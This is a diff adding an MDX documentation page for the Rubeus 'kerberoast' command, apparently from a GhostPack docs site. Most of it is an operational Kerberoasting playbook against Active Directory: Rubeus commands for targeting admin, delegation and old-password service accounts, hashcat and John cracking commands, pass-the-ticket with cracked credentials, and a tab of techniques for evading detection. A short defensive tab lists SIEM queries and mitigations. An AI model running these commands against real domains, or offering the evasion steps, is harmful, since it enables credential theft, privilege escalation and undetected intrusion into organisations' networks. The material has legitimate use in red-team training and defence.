@@ -1,0 +1,750 @@
+---
+title: 'kerberoast'
+description: 'Perform Kerberoasting attacks to extract service account credentials'
+icon: 'fire'
+sidebarTitle: 'kerberoast'
+---
+
+<Info>
+**Kerberoasting** is one of the most effective post-compromise attacks for escalating privileges in Active Directory environments by targeting service accounts with weak passwords.
+</Info>
+
+## Overview
+
+Kerberoasting attacks request service tickets for accounts with Service Principal Names (SPNs) and extract the ticket's encrypted portion for offline password cracking. This technique exploits the fact that service tickets are encrypted with the target service account's password hash.
+
+<CardGroup cols={3}>
+  <Card title="Service Discovery" icon="radar">
+    Identify accounts with Service Principal Names
+  </Card>
+  <Card title="Ticket Extraction" icon="download">
+    Request and extract encrypted service tickets
+  </Card>
+  <Card title="Offline Cracking" icon="hammer">
+    Crack extracted hashes with external tools
+  </Card>
+</CardGroup>
+
+<Frame>
+  <img
+    src="/images/kerberoasting-flow.png"
+    alt="Kerberoasting Attack Flow"
+    caption="Complete Kerberoasting attack workflow from SPN discovery to credential cracking"
+  />
+</Frame>
+
+## Attack Methodology
+
+<Steps>
+  <Step title="SPN Discovery">
+    Identify service accounts in the domain with registered SPNs
+  </Step>
+  <Step title="Ticket Request">
+    Request TGS tickets for target service accounts
+  </Step>
+  <Step title="Hash Extraction">
+    Extract encrypted portion of service tickets
+  </Step>
+  <Step title="Offline Cracking">
+    Use hashcat or John to crack the extracted hashes
+  </Step>
+  <Step title="Credential Validation">
+    Test cracked credentials for access and privileges
+  </Step>
+</Steps>
+
+## Syntax Variations
+
+<Tabs>
+  <Tab title="Basic Usage">
+    <CodeGroup>
+    ```bash All Service Accounts
+    # Target all service accounts in domain
+    Rubeus.exe kerberoast
+    ```
+
+    ```bash Specific Service
+    # Target specific SPN
+    Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local:1433"
+    ```
+
+    ```bash Specific User
+    # Target specific service account
+    Rubeus.exe kerberoast /user:svc_sql
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Advanced Targeting">
+    <CodeGroup>
+    ```bash LDAP Filtering
+    # Target admin service accounts
+    Rubeus.exe kerberoast /ldapfilter:"admincount=1"
+
+    # Target specific OU
+    Rubeus.exe kerberoast /ou:"OU=Service Accounts,DC=corp,DC=local"
+    ```
+
+    ```bash Bulk Operations
+    # Target users from file
+    Rubeus.exe kerberoast /users:C:\temp\service_accounts.txt
+
+    # Target SPNs from file
+    Rubeus.exe kerberoast /spns:C:\temp\target_spns.txt
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="OPSEC Mode">
+    <CodeGroup>
+    ```bash Stealth Operations
+    # Use OPSEC features
+    Rubeus.exe kerberoast /opsec
+
+    # Specific encryption and delays
+    Rubeus.exe kerberoast /opsec /delay:5000 /jitter:30
+    ```
+
+    ```bash Output Management
+    # Save to file for processing
+    Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
+
+    # John the Ripper format
+    Rubeus.exe kerberoast /format:john /outfile:john_hashes.txt
+    ```
+    </CodeGroup>
+  </Tab>
+</Tabs>
+
+## Targeting Parameters
+
+<Expandable title="Service Targeting" icon="crosshairs" defaultOpen>
+  <ParamField path="spn" type="string">
+    Target specific Service Principal Name
+    <Tooltip tip="Use full SPN format: service/host.domain.com:port">
+      Example: `MSSQLSvc/sql01.corp.local:1433`
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="spns" type="string">
+    File containing list of SPNs to target
+    <Expandable title="File Format">
+      One SPN per line:
+      ```
+      MSSQLSvc/sql01.corp.local:1433
+      HTTP/web01.corp.local
+      CIFS/fileserver.corp.local
+      ```
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="user" type="string">
+    Target specific username with SPNs
+  </ParamField>
+
+  <ParamField path="users" type="string">
+    File containing list of usernames to target
+  </ParamField>
+</Expandable>
+
+<Expandable title="LDAP Filtering" icon="filter">
+  <ParamField path="ldapfilter" type="string">
+    Custom LDAP filter for advanced targeting
+    <Expandable title="Common Filters">
+      - `admincount=1` - Administrative accounts
+      - `serviceprincipalname=*` - Any account with SPNs
+      - `samaccountname=svc_*` - Service accounts by naming pattern
+      - `useraccountcontrol:1.2.840.113556.1.4.803:=512` - Normal accounts only
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="ou" type="string">
+    Target specific Organizational Unit
+    <Tooltip tip="Use full distinguished name format">
+      Example: `"OU=Service Accounts,DC=corp,DC=local"`
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="domain" type="string">
+    Target domain (default: current domain)
+  </ParamField>
+
+  <ParamField path="dc" type="string">
+    Specific domain controller to query
+  </ParamField>
+</Expandable>
+
+<Expandable title="Output Options" icon="file-export">
+  <ParamField path="format" type="string">
+    Hash output format for cracking tools
+    <Expandable title="Supported Formats">
+      - `hashcat` (default) - Hashcat mode 13100
+      - `john` - John the Ripper format
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="outfile" type="string">
+    Save extracted hashes to file
+  </ParamField>
+
+  <ParamField path="nowrap" type="boolean">
+    Don't wrap long lines in output
+  </ParamField>
+
+  <ParamField path="simple" type="boolean">
+    Output only the crackable hash portion
+  </ParamField>
+</Expandable>
+
+<Expandable title="OPSEC Options" icon="user-secret">
+  <ParamField path="opsec" type="boolean">
+    Enable OPSEC-safe features
+    <Tooltip tip="Implements timing delays and encryption preferences">
+      Recommended for stealth operations
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="delay" type="number">
+    Delay in milliseconds between requests
+    <Tooltip tip="Helps avoid detection by spreading requests over time">
+      Recommended: 3000-10000ms for stealth
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="jitter" type="number">
+    Random percentage variation in delay (0-100)
+    <Tooltip tip="Adds randomness to request timing">
+      Example: 30 = ±30% variation in delay
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="aes" type="boolean">
+    Request AES256 encryption (less common, more suspicious)
+  </ParamField>
+</Expandable>
+
+<Expandable title="Advanced Options" icon="cog">
+  <ParamField path="stats" type="boolean">
+    Display statistics about service accounts
+  </ParamField>
+
+  <ParamField path="resultlimit" type="number">
+    Limit number of results returned
+  </ParamField>
+
+  <ParamField path="pwdsetafter" type="string">
+    Only target accounts with passwords set after date
+    <Tooltip tip="Format: MM/DD/YYYY">
+      Useful for targeting recently changed passwords
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="pwdsetbefore" type="string">
+    Only target accounts with passwords set before date
+    <Tooltip tip="Format: MM/DD/YYYY">
+      Useful for targeting old, potentially weak passwords
+    </Tooltip>
+  </ParamField>
+</Expandable>
+
+## Response Format
+
+<Tabs>
+  <Tab title="Successful Extraction">
+    ```bash
+    [*] Action: Kerberoasting
+
+    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+    [*] Target SPN             : MSSQLSvc/sql01.corp.local:1433
+    [*] Target Name            : svc_sql
+    [*] Target Domain          : CORP.LOCAL
+    [*] Searching path 'LDAP://DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+    [*] Total kerberoastable users : 15
+
+    [*] SamAccountName         : svc_sql
+    [*] DistinguishedName      : CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
+    [*] ServicePrincipalName   : MSSQLSvc/sql01.corp.local:1433
+    [*] PwdLastSet             : 1/15/2024 2:15:30 PM
+    [*] Supported ETypes       : RC4_HMAC_DEFAULT
+    [*] Hash                   : $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$hash_data_here
+    ```
+
+    <ResponseField name="Target Information" type="object">
+      Details about the targeted service account
+      <Expandable title="Fields">
+        - **SamAccountName**: Username of service account
+        - **ServicePrincipalName**: The targeted SPN
+        - **PwdLastSet**: When password was last changed
+        - **Supported ETypes**: Encryption types supported
+      </Expandable>
+    </ResponseField>
+
+    <ResponseField name="Hash" type="string">
+      Extracted hash in specified format for cracking
+    </ResponseField>
+
+    <ResponseField name="Statistics" type="object">
+      Summary information about the operation
+      <Expandable title="Metrics">
+        - **Total kerberoastable users**: Number of accounts with SPNs
+        - **Successful extractions**: Hashes successfully extracted
+        - **Failed requests**: Services that couldn't be accessed
+      </Expandable>
+    </ResponseField>
+  </Tab>
+
+  <Tab title="No Results">
+    ```bash
+    [*] Action: Kerberoasting
+
+    [*] Target SPN             : MSSQLSvc/sql01.corp.local:1433
+    [*] Searching path 'LDAP://DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*))'
+
+    [!] No users found to Kerberoast!
+    ```
+
+    <Info>
+      Common reasons for no results:
+      - No service accounts with SPNs in target domain
+      - Insufficient permissions to query LDAP
+      - Target-specific filters too restrictive
+      - Service accounts don't allow TGS requests
+    </Info>
+  </Tab>
+
+  <Tab title="Error Scenarios">
+    ```bash
+    [!] LDAP query failed!
+    System.DirectoryServices.DirectoryServiceCOMException: The server is not operational.
+    ```
+
+    <Warning>
+      Common error scenarios:
+      - **LDAP query failed**: Domain controller unreachable
+      - **Access denied**: Insufficient permissions for LDAP queries
+      - **No current user context**: Need valid domain authentication
+      - **Clock skew**: Time synchronization issues
+    </Warning>
+  </Tab>
+</Tabs>
+
+## Hash Format Examples
+
+<Tabs>
+  <Tab title="Hashcat Format">
+    ```bash
+    $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3d4e5f6...
+    ```
+
+    <ResponseField name="Format Components" type="object">
+      Breakdown of hashcat format structure
+      <Expandable title="Structure">
+        - `$krb5tgs$` - Kerberos TGS identifier
+        - `23` - Encryption type (RC4-HMAC)
+        - `*svc_sql$CORP.LOCAL$` - Username and domain
+        - `MSSQLSvc/sql01.corp.local:1433*` - Service principal name
+        - `$hash_data` - Encrypted ticket portion for cracking
+      </Expandable>
+    </ResponseField>
+
+    **Cracking Command:**
+    ```bash
+    hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+    ```
+  </Tab>
+
+  <Tab title="John Format">
+    ```bash
+    svc_sql:$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3d4e5f6...
+    ```
+
+    <ResponseField name="John Format" type="string">
+      Username prefix with colon-separated hash
+    </ResponseField>
+
+    **Cracking Command:**
+    ```bash
+    john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    ```
+  </Tab>
+
+  <Tab title="AES Hashes">
+    ```bash
+    $krb5tgs$18$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3d4e5f6...
+    ```
+
+    <Note>
+      AES-encrypted hashes (type 18) are significantly harder to crack than RC4 hashes (type 23) and may not be practical for offline attacks.
+    </Note>
+
+    **Hashcat AES Support:**
+    ```bash
+    hashcat -m 19600 aes_hashes.txt wordlist.txt  # AES128
+    hashcat -m 19700 aes_hashes.txt wordlist.txt  # AES256
+    ```
+  </Tab>
+</Tabs>
+
+## Complete Attack Workflow
+
+<Steps>
+  <Step title="Initial Reconnaissance">
+    Discover service accounts and assess the target environment:
+
+    ```bash
+    # Get statistics about service accounts
+    Rubeus.exe kerberoast /stats
+
+    # Target administrative service accounts
+    Rubeus.exe kerberoast /ldapfilter:"admincount=1" /stats
+    ```
+  </Step>
+
+  <Step title="OPSEC-Safe Extraction">
+    Perform the actual kerberoasting with stealth considerations:
+
+    ```bash
+    # OPSEC-safe kerberoasting with delays
+    Rubeus.exe kerberoast /opsec /delay:5000 /jitter:30 /outfile:hashes.txt
+
+    # Target specific high-value accounts
+    Rubeus.exe kerberoast /user:svc_sql /opsec /format:hashcat
+    ```
+  </Step>
+
+  <Step title="Hash Processing">
+    Prepare hashes for cracking with external tools:
+
+    ```bash
+    # Extract hashes to file
+    Rubeus.exe kerberoast /outfile:hashcat_hashes.txt /format:hashcat /nowrap
+
+    # Verify hash format
+    head -n 5 hashcat_hashes.txt
+    ```
+  </Step>
+
+  <Step title="Offline Cracking">
+    Use hashcat or John the Ripper to crack the extracted hashes:
+
+    <CodeGroup>
+    ```bash Hashcat
+    # Basic dictionary attack
+    hashcat -m 13100 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt
+
+    # Advanced rule-based attack
+    hashcat -m 13100 hashcat_hashes.txt wordlist.txt -r rules/best64.rule
+
+    # Mask attack for corporate passwords
+    hashcat -m 13100 hashcat_hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?s
+    ```
+
+    ```bash John the Ripper
+    # Dictionary attack
+    john --format=krb5tgs john_hashes.txt --wordlist=rockyou.txt
+
+    # Show cracked passwords
+    john --format=krb5tgs john_hashes.txt --show
+    ```
+    </CodeGroup>
+  </Step>
+
+  <Step title="Credential Validation">
+    Test cracked credentials for access and privileges:
+
+    ```bash
+    # Test cracked service account
+    Rubeus.exe asktgt /user:svc_sql /password:CrackedPassword123! /ptt
+
+    # Enumerate accessible services
+    Rubeus.exe asktgs /service:cifs/fileserver.corp.local
+    ```
+  </Step>
+</Steps>
+
+## Advanced Targeting Strategies
+
+<Tabs>
+  <Tab title="High-Value Targets">
+    <Expandable title="Administrative Service Accounts">
+      ```bash
+      # Accounts with administrative privileges
+      Rubeus.exe kerberoast /ldapfilter:"admincount=1"
+
+      # Accounts in privileged groups
+      Rubeus.exe kerberoast /ldapfilter:"memberof=CN=Domain Admins,CN=Users,DC=corp,DC=local"
+      ```
+    </Expandable>
+
+    <Expandable title="Delegation-Enabled Accounts">
+      ```bash
+      # Constrained delegation accounts
+      Rubeus.exe kerberoast /ldapfilter:"msds-allowedtodelegateto=*"
+
+      # Unconstrained delegation (high value)
+      Rubeus.exe kerberoast /ldapfilter:"useraccountcontrol:1.2.840.113556.1.4.803:=524288"
+      ```
+    </Expandable>
+
+    <Expandable title="Service-Specific Targeting">
+      ```bash
+      # SQL Server service accounts
+      Rubeus.exe kerberoast /ldapfilter:"serviceprincipalname=MSSQLSvc*"
+
+      # Exchange service accounts
+      Rubeus.exe kerberoast /ldapfilter:"serviceprincipalname=exchangeMDB*"
+
+      # IIS/Web service accounts
+      Rubeus.exe kerberoast /ldapfilter:"serviceprincipalname=HTTP*"
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Password Age Targeting">
+    <Expandable title="Old Passwords">
+      ```bash
+      # Passwords not changed in 2+ years (likely weak)
+      Rubeus.exe kerberoast /pwdsetbefore:"01/01/2022"
+
+      # Service accounts with old passwords
+      Rubeus.exe kerberoast /ldapfilter:"samaccountname=svc_*" /pwdsetbefore:"01/01/2023"
+      ```
+    </Expandable>
+
+    <Expandable title="Recently Changed">
+      ```bash
+      # Recently changed passwords (may follow patterns)
+      Rubeus.exe kerberoast /pwdsetafter:"01/01/2024"
+
+      # Accounts changed in specific time window
+      Rubeus.exe kerberoast /pwdsetafter:"06/01/2024" /pwdsetbefore:"08/01/2024"
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Organizational Targeting">
+    <Expandable title="Specific OUs">
+      ```bash
+      # Service accounts OU
+      Rubeus.exe kerberoast /ou:"OU=Service Accounts,DC=corp,DC=local"
+
+      # Application-specific OUs
+      Rubeus.exe kerberoast /ou:"OU=SQL Services,OU=Applications,DC=corp,DC=local"
+      ```
+    </Expandable>
+
+    <Expandable title="Cross-Domain">
+      ```bash
+      # Target child domain
+      Rubeus.exe kerberoast /domain:child.corp.local
+
+      # Target specific domain controller
+      Rubeus.exe kerberoast /domain:corp.local /dc:dc01.corp.local
+      ```
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## OPSEC Considerations
+
+<Warning>
+**Detection Risk**: Kerberoasting generates TGS requests that can be monitored by security tools and may appear in domain controller logs.
+</Warning>
+
+<Tabs>
+  <Tab title="Detection Vectors">
+    <Expandable title="Domain Controller Logs" defaultOpen>
+      **Event ID 4769** - Kerberos TGS Request:
+      - High volume of TGS requests from single source
+      - Requests for service accounts not typically accessed
+      - RC4 encryption requests in AES-only environments
+      - Requests for administrative service accounts
+    </Expandable>
+
+    <Expandable title="Network Monitoring">
+      - Unusual Kerberos traffic patterns
+      - High frequency of TGS requests
+      - Traffic to domain controllers from non-standard sources
+      - LDAP queries for service principal names
+    </Expandable>
+
+    <Expandable title="Host-Based Detection">
+      - Processes making unusual Kerberos API calls
+      - Memory access patterns consistent with ticket extraction
+      - File creation in temp directories (hash output files)
+      - Execution of password cracking tools
+    </Expandable>
+  </Tab>
+
+  <Tab title="Evasion Techniques">
+    <Expandable title="Timing and Volume" defaultOpen>
+      ```bash
+      # Implement delays between requests
+      Rubeus.exe kerberoast /delay:10000 /jitter:50
+
+      # Limit targeting to reduce noise
+      Rubeus.exe kerberoast /user:specific_target /opsec
+
+      # Spread operations over time
+      Rubeus.exe kerberoast /resultlimit:5 /delay:30000
+      ```
+    </Expandable>
+
+    <Expandable title="Request Patterns">
+      ```bash
+      # Use legitimate business hours
+      # Schedule operations during 9-5 business hours
+
+      # Mimic normal authentication patterns
+      # Space requests to appear like normal service access
+
+      # Target during high activity periods
+      # Blend with legitimate authentication traffic
+      ```
+    </Expandable>
+
+    <Expandable title="Technical Evasion">
+      ```bash
+      # Force AES encryption (less suspicious in modern environments)
+      Rubeus.exe kerberoast /aes
+
+      # Use specific domain controllers
+      Rubeus.exe kerberoast /dc:dc02.corp.local
+
+      # Limit LDAP queries
+      Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local:1433"
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Defensive Countermeasures">
+    <Expandable title="Detection Rules">
+      **SIEM Queries for Kerberoasting:**
+      ```sql
+      -- High volume TGS requests
+      SELECT * FROM events
+      WHERE event_id = 4769
+      GROUP BY source_ip
+      HAVING COUNT(*) > 50
+      WITHIN 1 HOUR
+
+      -- RC4 requests for service accounts
+      SELECT * FROM events
+      WHERE event_id = 4769
+      AND encryption_type = 'RC4'
+      AND service_name LIKE 'svc_%'
+      ```
+    </Expandable>
+
+    <Expandable title="Mitigation Strategies">
+      **Organizational Controls:**
+      - Strong password policies for service accounts
+      - Regular password rotation schedules
+      - Managed Service Accounts (MSAs) where possible
+      - Least privilege access for service accounts
+
+      **Technical Controls:**
+      - Enable AES encryption for Kerberos
+      - Monitor TGS request patterns
+      - Implement service account monitoring
+      - Use Group Managed Service Accounts (gMSAs)
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## Troubleshooting
+
+<Expandable title="Common Issues" icon="exclamation-triangle">
+  <Tabs>
+    <Tab title="No Results">
+      **Problem**: No kerberoastable users found
+
+      **Solutions**:
+      - Verify LDAP connectivity to domain controllers
+      - Check user permissions for LDAP queries
+      - Confirm service accounts exist with SPNs
+      - Try broader LDAP filters
+
+      ```bash
+      # Test LDAP connectivity
+      Rubeus.exe kerberoast /stats
+
+      # Try different targeting
+      Rubeus.exe kerberoast /ldapfilter:"serviceprincipalname=*"
+      ```
+    </Tab>
+
+    <Tab title="Access Denied">
+      **Problem**: Insufficient permissions for operations
+
+      **Solutions**:
+      - Ensure valid domain authentication
+      - Check if account has LDAP query permissions
+      - Verify domain controller accessibility
+      - Try different domain controllers
+
+      ```bash
+      # Test with specific DC
+      Rubeus.exe kerberoast /dc:dc01.corp.local
+
+      # Verify current authentication
+      Rubeus.exe klist
+      ```
+    </Tab>
+
+    <Tab title="Cracking Issues">
+      **Problem**: Unable to crack extracted hashes
+
+      **Solutions**:
+      - Verify hash format compatibility
+      - Try different wordlists and rules
+      - Consider password complexity requirements
+      - Use appropriate hashcat modes
+
+      ```bash
+      # Verify hash format
+      head -n 1 hashes.txt
+
+      # Try different attack modes
+      hashcat -m 13100 hashes.txt --show  # Show any already cracked
+      ```
+    </Tab>
+  </Tabs>
+</Expandable>
+
+## Integration with Other Tools
+
+<CardGroup cols={2}>
+  <Card title="BloodHound Integration" icon="eye">
+    Use BloodHound to identify high-value service accounts before kerberoasting
+  </Card>
+  <Card title="Hashcat/John" icon="hammer">
+    Process extracted hashes with dedicated password cracking tools
+  </Card>
+  <Card title="Impacket Integration" icon="python">
+    Use GetUserSPNs.py for alternative SPN enumeration and targeting
+  </Card>
+  <Card title="PowerView Integration" icon="powershell">
+    Combine with PowerView for enhanced Active Directory reconnaissance
+  </Card>
+</CardGroup>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="asreproast" icon="fire" href="/ghostpack-docs/Rubeus-mdx/commands/roasting/asreproast">
+    Alternative credential attack for accounts without pre-auth
+  </Card>
+  <Card title="asktgt" icon="ticket" href="/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt">
+    Use cracked credentials to request TGTs
+  </Card>
+  <Card title="s4u" icon="share" href="/ghostpack-docs/Rubeus-mdx/commands/delegation/s4u">
+    Abuse service accounts with delegation rights
+  </Card>
+  <Card title="silver" icon="medal" href="/ghostpack-docs/Rubeus-mdx/commands/forgery/silver">
+    Create silver tickets with compromised service accounts
+  </Card>
+</CardGroup>
